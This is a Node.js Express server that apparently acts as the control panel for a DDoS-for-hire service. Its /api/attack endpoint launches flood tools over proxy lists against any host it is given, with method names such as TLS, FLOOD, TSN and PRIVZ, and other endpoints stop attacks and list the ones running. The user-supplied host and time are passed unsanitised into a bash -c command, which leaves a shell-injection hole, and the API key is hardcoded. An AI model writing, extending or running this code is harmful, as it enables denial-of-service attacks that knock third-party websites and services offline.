'use strict';

const express = require('express');
const { spawn } = require('child_process');

const app = express();
const port = 8080;
const API_KEY = 'yeah';

const methods = {
  FLOOD: 'flood.js',
  PRIVZ: 'priv-z',
  R2: 'r2.js',
  TLS: 'tls.js',
  TLSV2: 'tlsv2.js',
  TLSV3: 'tlsv3.js',
  TLSV4: 'tlsv4.js',
  FLOODV2: 'm-flood.js',
  H2CP: 'flh',
  SCRAPE: 'sc.js',
  BROWSER: 'browser.js',
  ZLH: 'test',
  TSN: 'flh',
  FLH: 'flh',
  FLOODX: 'floodx.js',
};

// pid -> { child, method, host, startedAt }
const activeProcesses = new Map();

function generateCommand(method, host, time) {
  switch (method) {
    case 'TLS':       return `node tls.js ${host} ${time} 32 4 proxy.txt`;
    case 'TLSV4':     return `node tlsv4.js ${host} ${time} 50 8`;
    case 'FLOOD':     return `node flood.js ${host} ${time} 50 4 proxy.txt`;
    case 'FLOODX':    return `node floodx.js ${host} ${time} 8 3 proxy.txt`;
    case 'FLOODV2':   return `node m-flood.js ${host} ${time} 32 4 proxy.txt --full`;
    case 'LEGIT':     return `node legit.js GET ${host} ${time} 2 8 proxy.txt`;
    case 'TLSV2':     return `node tlsv2.js ${host} ${time} 64 4 proxy.txt`;
    case 'H2CP':     return `/flh ${host} ${time} 32 4 proxy.txt --poison`;
    case 'SCRAPE':    return `node sc.js`;
    case 'TSN':        return `./flh ${host} ${time} 32 4 proxy.txt --tsunami`;
    case 'BROWSER':   return `node browser.js ${host} ${time} 2 1 3`;
    case 'ZLH':       return `./test ${host} ${time} 32 4 px.txt --method GET --blast`;
    case 'FLH': return `./flh ${host} ${time} 32 4 proxy.txt --origin-kill`;
    case 'PRIVZ':     return `./priv-z -target ${host} -time ${time} -rate 10000 -threads 512`;
    default:          return null;
  }
}

function auth(req, res, next) {
  if (req.query.key !== API_KEY) {
    return res.status(401).json({ error: 'Invalid key' });
  }
  next();
}

// ===== START ATTACK =====
app.get('/api/attack', auth, (req, res) => {
  const { host, time, method } = req.query;

  if (!methods[method]) {
    return res.status(400).json({ error: 'Unknown method' });
  }
  if (!host || !time) {
    return res.status(400).json({ error: 'host and time are required' });
  }

  const command = generateCommand(method, host, time);
  if (!command) {
    return res.status(400).json({ error: 'Command not generated' });
  }

  let child;
  try {
    child = spawn('bash', ['-c', command], {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to spawn process', detail: err.message });
  }

  const pid = child.pid;
  activeProcesses.set(pid, {
    child,
    method: method.toUpperCase(),
    host,
    startedAt: Date.now(),
  });

  child.stdout.on('data', (d) => console.log(`[${pid}][${method}] stdout: ${d}`));
  child.stderr.on('data', (d) => console.error(`[${pid}][${method}] stderr: ${d}`));

  child.on('close', (code) => {
    console.log(`[${pid}][${method}] exited with code ${code}`);
    activeProcesses.delete(pid);
  });

  child.on('error', (err) => {
    console.error(`[${pid}][${method}] spawn error:`, err);
    activeProcesses.delete(pid);
  });

  child.unref();

  return res.json({ status: 'Attack initiated', pid, host, time, method });
});

// ===== STOP (filter by method optional) =====
// /api/stop?key=yeah              → stop semua
// /api/stop?key=yeah&method=TLS   → stop method TLS saja
app.get('/api/stop', auth, (req, res) => {
  const { method } = req.query;
  const targetMethod = method ? method.toUpperCase() : null;
  const killed = [];

  for (const [pid, data] of activeProcesses) {
    if (targetMethod && data.method !== targetMethod) continue;
    try {
      data.child.kill('SIGKILL');
      killed.push(pid);
    } catch (err) {
      console.error(`Failed to kill ${pid}:`, err.message);
    }
    activeProcesses.delete(pid);
  }

  return res.json({
    status: targetMethod ? `Stopped ${targetMethod}` : 'All attacks stopped',
    method: targetMethod || 'ALL',
    killed,
    count: killed.length,
  });
});

// ===== STATUS =====
app.get('/api/status', auth, (req, res) => {
  const list = [];
  for (const [pid, data] of activeProcesses) {
    list.push({
      pid,
      method: data.method,
      host: data.host,
      startedAt: data.startedAt,
      running: Math.floor((Date.now() - data.startedAt) / 1000) + 's',
    });
  }
  return res.json({ total: list.length, processes: list });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
